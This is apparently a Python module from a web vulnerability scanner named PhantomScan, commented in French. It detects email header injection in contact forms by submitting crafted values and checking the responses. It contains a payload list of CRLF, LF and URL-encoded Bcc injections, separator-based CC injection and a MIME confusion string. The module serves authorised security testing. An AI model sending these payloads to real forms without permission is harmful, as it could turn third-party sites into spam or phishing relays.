"""
PhantomScan — Email Header Injection Scanner
=============================================
Détecte les injections dans les headers SMTP via les formulaires web.

Quand une application prend un input utilisateur (email, nom, sujet)
et le passe directement dans un header email, un attaquant peut injecter
des headers supplémentaires : Bcc, Cc, From, Reply-To, Subject, X-Mailer.

Conséquences :
  - Spam relay : envoyer des emails à des tiers via le serveur de l'app
  - Phishing : modifier le champ From/Reply-To
  - Information disclosure : BCC vers un email contrôlé par l'attaquant

Techniques testées :
  1. Injection CRLF dans les champs email (\\r\\n, %0d%0a, %0a)
  2. Injection via le champ "name" / "subject" / "message"
  3. Headers BCC, CC, To supplémentaires
  4. MIME boundary confusion
"""

from __future__ import annotations

import re
from typing import AsyncIterator
from urllib.parse import urlparse, urlencode

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity
from phantomscan.core.scanner_mixin import ScannerMixin


# ── Endpoints typiques avec formulaires contact ───────────────────────────────
_CONTACT_PATHS = [
    "/contact", "/contact-us", "/contact_us", "/contactus",
    "/feedback", "/support", "/help", "/report",
    "/api/contact", "/api/feedback", "/api/email",
    "/send", "/sendmail", "/mail",
    "/subscribe", "/newsletter",
]

# ── Payloads d'injection SMTP ─────────────────────────────────────────────────
# Format : (payload_suffix, description, injection_type)
_EMAIL_INJECTION_PAYLOADS = [
    # CRLF dans l'email
    ("attacker@test.com\r\nBcc: bcc-victim@phantom-test.com",       "CRLF BCC injection"),
    ("attacker@test.com\nBcc: bcc-victim@phantom-test.com",         "LF BCC injection"),
    ("attacker@test.com%0d%0aBcc: bcc-victim@phantom-test.com",     "URL-encoded CRLF BCC"),
    ("attacker@test.com%0aBcc: bcc-victim@phantom-test.com",        "URL-encoded LF BCC"),
    # CC injection via séparateur
    ("attacker@test.com, bcc-victim@phantom-test.com",              "Comma CC injection"),
    ("attacker@test.com; bcc-victim@phantom-test.com",              "Semicolon CC injection"),
    # Subject injection
    ("Test\r\nBcc: bcc-victim@phantom-test.com",                    "Subject CRLF BCC"),
    # MIME boundary
    ("text/plain\r\nContent-Type: text/html\r\n\r\n<script>",      "MIME type confusion"),
]

# ── Indicateurs de succès / erreur dans les réponses ─────────────────────────
_EMAIL_SENT_RE = re.compile(
    r"(?:message sent|email sent|thank you|we.?ll get back|"
    r"received your|submission successful|form submitted)",
    re.I,
)

_EMAIL_ERROR_RE = re.compile(
    r"(?:invalid email|email format|please enter.*valid|"
    r"smtp error|mail.*failed|unable to send)",
    re.I,
)

# Indicateur de réflexion d'un header injecté
_HEADER_REFLECTED_RE = re.compile(
    r"(?:Bcc:|Cc:|Reply-To:|X-Mailer:|bcc-victim@phantom-test\.com)",
    re.I,
)


class EmailInjectionScanner(ScannerMixin):
    """Scanner d'injection dans les headers email."""

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heur = heuristic
        self._cfg = cfg
        self._found: set[str] = set()

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Découvrir les formulaires de contact
        contact_endpoints = await self._find_contact_forms(base)

        for endpoint, fields in contact_endpoints:
            async for f in self._test_email_injection(endpoint, fields):
                yield f

    # ── Découverte ────────────────────────────────────────────────────────────

    async def _find_contact_forms(self, base: str) -> list[tuple[str, list[str]]]:
        """Trouve les formulaires de contact et leurs champs."""
        found = []
        for path in _CONTACT_PATHS:
            url = base + path
            resp = await self._req.get(url)
            if resp.error or resp.status not in (200, 405):
                continue

            body = resp.body or ""
            body_low = body.lower()

            # Vérifier que c'est bien un formulaire email
            if not any(kw in body_low for kw in ["email", "mail", "contact", "message"]):
                continue

            # Extraire les champs du formulaire
            fields = []
            email_field_re = re.compile(
                r'<input[^>]+(?:name|id)=["\']([^"\']+)["\'][^>]*(?:type=["\']email["\']|placeholder=["\'][^"\']*email[^"\']*["\'])',
                re.I,
            )
            name_field_re = re.compile(
                r'<input[^>]+(?:name|id)=["\']([^"\']+)["\'][^>]*type=["\'](?:text|email)["\']',
                re.I,
            )

            for m in email_field_re.finditer(body):
                fields.append(("email", m.group(1)))
            for m in name_field_re.finditer(body):
                if m.group(1).lower() not in [f[1] for f in fields]:
                    fields.append(("text", m.group(1)))

            # Champs par défaut si pas trouvés
            if not fields:
                fields = [
                    ("email", "email"), ("email", "from"),
                    ("text", "name"), ("text", "subject"),
                ]

            found.append((url, fields))
            if len(found) >= 3:
                break

        return found

    # ── Injection ─────────────────────────────────────────────────────────────

    async def _test_email_injection(
        self, endpoint: str, fields: list[tuple[str, str]]
    ) -> AsyncIterator[Finding]:
        """Teste chaque champ email avec les payloads d'injection."""
        # Baseline : soumettre le formulaire normalement
        normal_data = {}
        for ftype, fname in fields:
            if ftype == "email":
                normal_data[fname] = "test@phantom-normal.com"
            else:
                normal_data[fname] = "Normal test submission"
        normal_data.setdefault("message", "Test message from scanner")

        baseline = await self._req.send(ProbeRequest(
            method="POST",
            url=endpoint,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            body=urlencode(normal_data),
        ))
        baseline_body = baseline.body or "" if not baseline.error else ""

        # Tester chaque champ email avec les payloads
        for ftype, fname in fields:
            if ftype != "email":
                continue

            for payload, desc in _EMAIL_INJECTION_PAYLOADS[:5]:
                inject_data = {**normal_data, fname: payload}
                resp = await self._req.send(ProbeRequest(
                    method="POST",
                    url=endpoint,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    body=urlencode(inject_data),
                ))
                if resp.error:
                    continue

                body = resp.body or ""

                # Indicateur 1 : le header injecté est reflété dans la réponse
                if _HEADER_REFLECTED_RE.search(body) and not _HEADER_REFLECTED_RE.search(baseline_body):
                    key = f"email_inj:{endpoint}:{fname}"
                    if key not in self._found:
                        self._found.add(key)
                        yield Finding(
                            title=f"Email Header Injection · field `{fname}` ({desc})",
                            severity=Severity.MEDIUM,
                            url=endpoint,
                            module="vulns/email_injection",
                            description=(
                                f"Header email injecté reflété dans la réponse via le champ `{fname}`. "
                                "Un attaquant peut injecter des destinataires Bcc/Cc supplémentaires, "
                                "modifier le Reply-To ou utiliser l'app comme spam relay."
                            ),
                            evidence=(
                                f"Field: {fname} | Payload: {payload[:60]!r} | "
                                f"Header reflected in response"
                            ),
                            cwe="CWE-93",
                            remediation=(
                                "Valider les champs email avec une regex stricte. "
                                "Rejeter tout input contenant \\r ou \\n. "
                                "Utiliser une bibliothèque email qui encode proprement "
                                "les headers (MIME encoding)."
                            ),
                        )
                        return

                # Indicateur 2 : comportement différent (succès vs erreur selon payload)
                normal_sent = bool(_EMAIL_SENT_RE.search(baseline_body))
                injected_sent = bool(_EMAIL_SENT_RE.search(body))
                normal_error = bool(_EMAIL_ERROR_RE.search(baseline_body))

                if injected_sent and normal_sent and "phantom-test.com" in body:
                    key = f"email_inj_sent:{endpoint}:{fname}"
                    if key not in self._found:
                        self._found.add(key)
                        yield Finding(
                            title=f"Email Injection — Possible Relay · field `{fname}`",
                            severity=Severity.MEDIUM,
                            url=endpoint,
                            module="vulns/email_injection",
                            description=(
                                f"Email envoyé avec succès après injection dans `{fname}`. "
                                "Le domaine test phantom-test.com est reflété → possible relay."
                                "\nConfirmer en vérifiant les emails reçus sur bcc-victim@phantom-test.com."
                            ),
                            evidence=f"Field: {fname} | Payload: {payload[:60]!r} | Email sent",
                            cwe="CWE-93",
                            remediation="Valider et encoder tous les champs passés aux fonctions mail().",
                        )
                        return
